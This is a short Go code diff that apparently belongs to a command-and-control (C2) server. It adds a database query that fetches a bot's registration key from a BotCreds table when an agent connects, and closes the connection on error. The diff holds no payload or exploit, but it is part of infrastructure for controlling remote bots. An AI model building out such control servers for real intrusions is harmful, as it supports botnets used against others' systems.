@@ -1,6 +1,7 @@
 package main
 
 import (
+	database "c2/server/db"
 	"c2/server/models"
 	"c2/server/register"
 	"context"
@@ -50,7 +51,12 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// c.Db.
+	pb.RegsterKey, err = database.GetFromDB[string](c.Db, "SELECT registration_key FROM BotCreds WHERE id = ? ", pb.Agentid)
+	if err != nil {
+		log.Printf("Error fetching RegisterKey from DB for AgentID %s : %v ", pb.Agentid, err)
+		con.CloseNow()
+		return
+	}
 
 	b.Mu.Lock()
 	b.Con = con
